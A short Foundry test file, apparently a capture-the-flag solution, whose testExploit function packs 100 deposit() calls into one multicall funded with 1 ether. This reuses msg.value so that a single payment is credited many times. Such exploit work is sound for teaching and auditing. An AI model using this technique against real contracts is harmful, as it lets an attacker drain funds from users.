// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

import {BankBaseTest} from "./BankBase.t.sol";

contract BankTest is BankBaseTest {
    function testExploit() external validation {        
        bytes[] memory data = new bytes[](100);
        for (uint i = 0; i < 100; ++i)
            data[i] = abi.encodeWithSignature("deposit()");
        bank.multicall{value: 1 ether}(data);
    }
}
